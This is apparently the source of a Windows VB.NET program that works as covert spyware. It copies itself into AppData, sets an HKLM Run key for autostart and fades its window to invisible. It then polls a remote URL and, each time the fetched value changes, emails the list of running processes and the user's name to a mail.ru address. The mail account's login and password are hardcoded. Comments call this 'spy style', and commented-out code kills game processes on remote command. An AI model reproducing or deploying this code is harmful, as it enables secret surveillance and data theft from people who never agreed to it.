Imports System.IO
Imports System.Net
Imports System.Net.Mail

Public Class frmMain
    ''Important declarations
    '
    Dim sw As StreamWriter
    Dim sr As StreamReader

    Dim WithEvents wc As New WebClient

    'some global variables
    Dim structurePath As String = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) & "\" & CompanyName & "\" & ProductName & "\" 'where to save local files
    Dim quitAllow As Byte '0/1, 1 - program can be terminated, 0 - program can not (though taskkill still works)
    Dim Op As Byte '0/1, 1 - program thinks it is non-transparent already, 0 - program thinks it is yet transparent
    Dim OpInterval As Decimal = 0.05
    Dim TmInterval As Decimal = 10
    ' --- Dim savedLaunch As Byte '0/1, 1 - program was launched with cache file reading, 0 - program was not
    Dim Rar_data_backup As String 'value to read string from cache file

    ' --- Dim i As Integer '0-2147483647, it is responsible for timer counter, you can define first parameter here (in seconds)
    ''
    
    ''FIXES:
    '
    'fix2 - no exit except from task manager and program method
    Private Sub frmMain_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        quitAllow = 1 'spy style - it should be terminated by now so there will be no suspicions ~_~
        If quitAllow = 1 Then
            wc.CancelAsync()
            ' --- TmrCnt.Enabled = False
            ' --- Me.Dispose()
            ' --- Exit Sub or Application.Exit()
        Else
            e.Cancel = True
        End If
    End Sub
    ''

    ''Shows up, then fades out
    '
    Private Sub frmMain_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
        TmrVanish.Interval = TmInterval
        TmrVanish.Start()
    End Sub
    ''

    ''Main function
    '
    Public Shared Sub AlertStringDownloaded(ByVal sender As Object, ByVal e As DownloadStringCompletedEventArgs)
        '  If the string request went as planned and wasn't cancelled:
        If e.Cancelled = False AndAlso e.Error Is Nothing Then

            Dim Rar_data As String = CStr(e.Result)   'Use e.Result to get the String

            If Rar_data = " " Then
                System.Threading.Thread.Sleep(5000)
                frmMain.wc.DownloadStringAsync(New Uri(My.Resources.rarity_string))
                Exit Sub
            End If

            'If Rar_data = "kill" Then
            '    Process.GetProcessesByName("dota2")(0).Kill()
            '    Process.GetProcessesByName("dota")(0).Kill()
            '    ''Process.GetProcessesByName("dota2")(0).CloseMainWindow()
            '    ''Process.GetProcessesByName("dota")(0).CloseMainWindow()

            '    System.Threading.Thread.Sleep(5000)
            '    frmMain.wc.DownloadStringAsync(New Uri(My.Resources.rarity_string))
            '    Exit Sub
            'End If

            If Rar_data = frmMain.Rar_data_backup Then
                System.Threading.Thread.Sleep(5000)
                frmMain.wc.DownloadStringAsync(New Uri(My.Resources.rarity_string))
                Exit Sub
            End If

            'data write
            frmMain.Rar_data_backup = Rar_data
            '*
            Rar_data = "" 'not quite sure
            '*
            FileOpen(1, frmMain.structurePath & "cache.dat", OpenMode.Append)
            FileClose(1)
            frmMain.sw = New StreamWriter(frmMain.structurePath & "cache.dat")
            frmMain.sw.WriteLine(frmMain.Rar_data_backup)
            frmMain.sw.Close()

            'tasklist getting
            Dim FULL_tasklist As String = " | " 'value to store process' names
            For Each currentprocesses As Process In Process.GetProcesses
                FULL_tasklist += currentprocesses.ProcessName & " | "
            Next
            ''Dim pList() As System.Diagnostics.Process = System.Diagnostics.Process.GetProcesses
            ''For Each proc As System.Diagnostics.Process In pList
            ''    FULL_tasklist += proc.ProcessName & " | "
            ''Next
            ''Array.Clear(pList, 0, 1) 'not quite sure

            'e-mail sending
            Dim sc As New SmtpClient
            With sc
                .Host = "smtp.mail.ru"
                .Port = 25
                .EnableSsl = False
                .Credentials = New NetworkCredential("svetomechst", "plugin6")
            End With
            sc.Send("svetomechst@mail.ru", My.Resources.mailTO_string, My.User.Name & " (" & DateString & "  " & TimeOfDay & ")", FULL_tasklist)
            '*
            FULL_tasklist = ""
            sc.Dispose()
            '*
            System.Threading.Thread.Sleep(5000)
            frmMain.wc.DownloadStringAsync(New Uri(My.Resources.rarity_string))
            Exit Sub
        End If
    End Sub
    ''

    ''Loads the main function
    '
    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'fs
        IO.Directory.CreateDirectory(structurePath) 'what if already?
        If IO.Directory.Exists("svt_structure") = True Then My.Computer.FileSystem.MoveDirectory("svt_structure", structurePath, True)

        'copy itself to fs folder
        If Not My.Computer.FileSystem.FileExists(structurePath & My.Application.Info.AssemblyName & ".exe") = True Then
            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, structurePath & My.Application.Info.AssemblyName & ".exe")
        Else
            Dim Info As FileVersionInfo
            Info = FileVersionInfo.GetVersionInfo(structurePath & My.Application.Info.AssemblyName & ".exe")
            If Not ProductVersion = Info.ProductVersion Then
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, structurePath & My.Application.Info.AssemblyName & ".exe", True)
            End If
        End If
        'autorun
        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", ProductName, structurePath & My.Application.Info.AssemblyName & ".exe") 'what if already?
        ' --- My.Application.Info.DirectoryPath & "\"
        ''Dim Start As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        ''Start.SetValue(ProductName, structurePath & My.Application.Info.AssemblyName & ".exe")
        ''Start.Dispose()

        'data read
        If My.Computer.FileSystem.FileExists(structurePath & "cache.dat") = True Then
            sr = New StreamReader(structurePath & "cache.dat")
            Rar_data_backup = sr.ReadLine()
            sr.Close()
        End If

        'start program
        AddHandler wc.DownloadStringCompleted, AddressOf AlertStringDownloaded
        wc.DownloadStringAsync(New Uri(My.Resources.rarity_string))
        ' --- TmrCnt.Enabled = True
    End Sub
    ''

    'fade declaration
    Private Sub TmrVanish_Tick(sender As Object, e As EventArgs) Handles TmrVanish.Tick
        If Op = 1 Then
            Me.Opacity = Opacity - OpInterval
            If Opacity <= 0 Then
                TmrVanish.Stop() '' goto begin of tick cycle - if i wanna permanent rarity animation
            End If
            Exit Sub
        End If

        Me.Opacity = Opacity + OpInterval
        If Opacity >= 1 Then
            ' --- Me.Activate()
            Op = 1
            Exit Sub
        End If
    End Sub
    'timer counter declaration
    ' --- Private Sub TmrCnt_Tick(sender As Object, e As EventArgs) Handles TmrCnt.Tick
    ' ---     i = i + 1
    ' --- End Sub

    'DO NOT NEED использовать savedLaunch = 1 (if cache file was read for real)
    '? использовать время с момента запуска программы (if i = ~ then); TmrCnt[Check]: every X mins - send email

    'For Each currentprocesses As Process In Process.GetProcesses
    '                If currentprocesses.ProcessName = "dota2" Or "dota" Then
    '                    Process.GetProcessesByName("dota2")(0).Kill()
    '                    Process.GetProcessesByName("dota")(0).Kill()
    ' ''Process.GetProcessesByName("dota2")(0).CloseMainWindow()
    ' ''Process.GetProcessesByName("dota")(0).CloseMainWindow()
    '                End If
    '            Next
End Class
